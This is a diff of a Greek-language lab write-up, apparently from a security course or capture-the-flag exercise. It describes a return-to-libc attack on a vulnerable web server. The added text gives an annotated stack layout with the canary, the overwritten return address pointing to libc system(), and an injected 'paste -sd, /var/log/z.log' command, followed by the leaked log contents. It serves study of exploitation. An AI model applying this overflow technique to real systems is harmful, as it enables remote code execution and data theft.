@@ -619,81 +619,19 @@ x/40xw $sp
 cat /var/log/z.log
 ```
 μέσω της **system** η οποία κάνει fork και exec, θα δούμε με επιτυχία τα αποτελέσματα στο response γιατί όπως έχουμε δει και από το μάθημα '**Προγραμματισμός συστήματος**' ότι όταν γίνεται fork μια διεργασία στην πραγματικότητα γίνεται αντιγραφή όλου του προγράμματος όπως ήταν εκείνη τη στιγμή στη μνήμη σε ένα νέο process και η εκτέλεση συνεχίζει από το σημείο που έγινε το fork και μετά. 
- 
-Το θετικό με αυτό είναι ότι μαζί με τα περιεχόμενα της μνήμης του προγράμματος, το child process κληρονομεί ένα αντίγραφο των ανοικτών **file descriptors**. Αυτό σε συνδιασμό με την εντολή **dup2(clientfd, STDOUT_FILENO)** έχει ως αποτέλεσμα το standard output οποιασδήποτε εντολής δώσουμε να πηγαίνει κατευθείαν στον client. με αποτέλεσμα να βλέπαμε τα περιεχόμενα του αρχείου **z.log**.
 
-Τελος, καταλήξαμε στο συμπέρασμα πως πρέπει να κάνουμε την συνάρτηση **post_param** να επιστρέψει στην συνάρτηση **system**, οπότε έπρεπε να μάθουμε με gdb την διεύθυνση που βρίσκεται αυτή η εντολή στο **.text** του προγράμματος, να κάνουμε overwrite τον **saved $eip** της **post_param** με αυτή τη διεύθυνση καθώς και να κάνουμε overwrite το αμέσως επόμενο word πριν τον **saved $eip** με την τιμή ενός δείκτη σε συμβολοσειρά που θα περιέχει την εντολή προς εκτέλεση.
+Επιπλέον, μαζί με τα περιεχόμενα της μνήμης του προγράμματος, το child process κληρονομεί ένα αντίγραφο των ανοικτών **file descriptors**. Αυτό σε συνδιασμό με την εντολή **dup2(clientfd, STDOUT_FILENO)** έχει ως αποτέλεσμα το standard output οποιασδήποτε εντολής δώσουμε να πηγαίνει κατευθείαν στον client. 
 
-```
-Stack:
-+--------------------+  
-|                    |
-+--------------------+
-|                    |
-+--------------------+  
-|                    |
-+--------------------+ <==================== $ebp
-| 0xbfffef98         | <- Saved $ebp
-+--------------------+
-| 0x00404000         | <- Static address
-+--------------------+		
-| 0x00404000         | <- Static address
-+--------------------+
-| 0x786f3100         | <- Canary
-+--------------------+
-| . . . . . . . . .  |
-| . . . . . . . . .  | <- post_data buffer
-| . . . . . . . . .  |
-+--------------------+ <==================== $esp
-```
+Οπότε αν τρέχαμε την εντολή cat θα βλέπαμε τα περιεχόμενα του αρχείου **z.log** στον client.
 
+Τελος, καταλήξαμε στο συμπέρασμα πως πρέπει να κάνουμε την συνάρτηση **post_param** να επιστρέψει στην συνάρτηση **system**, οπότε έπρεπε
+1)  να μάθουμε με gdb την διεύθυνση που βρίσκεται αυτή η εντολή στο **.text** του προγράμματος, 
+2) να κάνουμε overwrite τον **saved $eip** της **post_param** με αυτή τη διεύθυνση,
+3) να κάνουμε overwrite το αμέσως επόμενο word πριν τον **saved $eip** με την τιμή ενός δείκτη σε συμβολοσειρά που θα περιέχει την εντολή προς εκτέλεση καθως και 
+4) να βάλουμε την συμβολοσειρά κάπου στην στοίβα για να δούμε αν θα λειτουργήσει.
 
 ### Επίθεση
-
-Για να γίνει η
-
-Επειδή στην συγκεκριμένη επίθεση κάνουμε την συνάρτηση **post_param** να επιστρέψει κατευθείαν μέσα στον κώδικα της **system** και η system για να εκτέλέσει την εντολή που της δώσαμε κάνει **fork** και την εκτελεί στον child κώδικα με **exec**, δεν χρειάστηκε να δώσουμε σωστή τιμή για τον **saved $ebp** γιατί το output της εντολής θα το βλέπαμε κανονικά.
-
-
-system argument
-
-pointer to string
-
-diorthosame to request script gia na min grafoume kathe fora 
-tis hex word addresses se morfi bytes me to xeri
-
-θελαμε να υπολογισουμε τη διευθυνση του system πρώτα και επειδή ξεκινούσε από b7 
-
-
-
-
-
-Τα περιεχόμενα του αρχείου z.log
-```
-Computing, approximate answer: 41.9933411112233311
-...
-
-
-
-Plan Z: troll humans who ask stupid questions (real fun).
-I told them I need 7.5 million years to compute this :D
-
-In the meanwhile I\'m travelling through time trolling humans of the past.
-Currently playing this clever dude using primitive hardware
- he\'s good but the
-next move is crushing...
-
-1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7
-
-PS. To reach me in the past use the code: "<next move><public IP of this machine>"
-
-PS2. To know a fish go to the water; to know a bird\'s song go to the mountains.\n'
-```
-
-
-
-
-
+Για να κάνουμε την επίθεση, πήραμε το request.py script που είχαμε χρησιμοποιήσει και στο προηγούμενο ερώτημα και το κάναμε να δέχεται hex words.
 
 Διορθωμένο script
 ```python
@@ -737,6 +675,88 @@ try:
 except requests.exceptions.RequestException as e:
     print(e)
 ```
+
+
+
+Πράγματι, πέτυχε το attack αλλά μας έφερνε μόνο την πρώτη γραμμή από το αρχείο με την εντολή **cat**. Έτσι, αποφασίσαμε να χρησιμοποιήσουμε κάποια άλλη εντολή που να επιστρέφει όλο το περιεχόμενο του αρχείου χωρίς αλλαγές γραμμής, η εντολή αυτή είναι η:
+```bash
+paste -sd, /var/log/z.log
+```
+Αναπαράσταση της στοίβας μετά το buffer overflow:
+```
+Stack:
+			  ...........
+			  ...........
+			  ...........
+0xbfffef24	+-------------+
+			| 0x70617374  | <- 'past'
+0xbfffef20  +-------------+
+			| 0x65202d73  | <- 'e -s'
+0xbfffef1c  +-------------+
+			| 0x642c202f  | <- 'd, /'
+0xbfffef18  +-------------+
+			| 0x7661722f  | <- 'var/'
+0xbfffef14  +-------------+
+			| 0x6c6f672f  | <- 'log/'							(--- route frame ---)
+0xbfffef10  +-------------+
+			| 0x7a2e6c6f  | <- 'z.lo'
+0xbfffef0c  +-------------+
+			| 0x67000000  | <- 'g\0'
+0xbfffef08  +-------------+  
+			| 0xbfffef24  | <- pointer to char* command
+0xbfffef04  +-------------+
+			| 0xbfffef08  | <- pointer to char** command (before: is char *param_name)
+0xbfffef00  +-------------+  
+			| 0xb7c55d3d  | <- saved $eip, <__libc_system+0> (before: is 0x401193 <route+384>)
+0xbfffeefc  +-------------+ <==================== $ebp
+			| 0xbfffef98  | <- saved $ebp
+0xbfffeef8  +-------------+
+			| 0x00404000  | <- static address
+0xbfffeef4  +-------------+		
+			| 0x00404000  | <- static address					(--- post_data frame ---)
+0xbfffeef0  +-------------+
+			| 0x786f3100  | <- canary
+0xbfffeeec	+-------------+
+			| 0x41414141  |
+			| . . . . . . | <- post_data buffer (100 bytes)
+			| 0x41414141  |
+0xbfffee88  +-------------+ <==================== $esp
+			  ...........
+			  ...........
+			  ...........
+```
+
+Επειδή στην συγκεκριμένη επίθεση κάνουμε την συνάρτηση **post_param** να επιστρέψει κατευθείαν μέσα στον κώδικα της **system** και η system για να εκτελέσει την εντολή που της δώσαμε κάνει **fork** και την εκτελεί στον child κώδικα με **exec**, δεν χρειάστηκε να δώσουμε σωστή τιμή για τον **saved $ebp** γιατί το output της εντολής θα το βλέπαμε κανονικά ακόμα και αν το child process που εξυπηρετεί το request κρασάρει.
+
+Τα περιεχόμενα του αρχείου z.log:
+```
+Computing, approximate answer: 41.9933411112233311
+...
+
+
+
+Plan Z: troll humans who ask stupid questions (real fun).
+I told them I need 7.5 million years to compute this :D
+
+In the meanwhile I\'m travelling through time trolling humans of the past.
+Currently playing this clever dude using primitive hardware
+ he\'s good but the
+next move is crushing...
+
+1.e4 c6 2.d4 d5 3.Nc3 dxe4 4.Nxe4 Nd7 5.Ng5 Ngf6 6.Bd3 e6 7.N1f3 h6 8.Nxe6 Qe7 9.0-0 fxe6 10.Bg6+ Kd8 11.Bf4 b5 12.a4 Bb7 13.Re1 Nd5 14.Bg3 Kc8 15.axb5 cxb5 16.Qd3 Bc6 17.Bf5 exf5 18.Rxe7 Bxe7
+
+PS. To reach me in the past use the code: "<next move><public IP of this machine>"
+
+PS2. To know a fish go to the water; to know a bird\'s song go to the mountains.\n'
+```
+
+
+
+
+
+
+
+
 
 
 
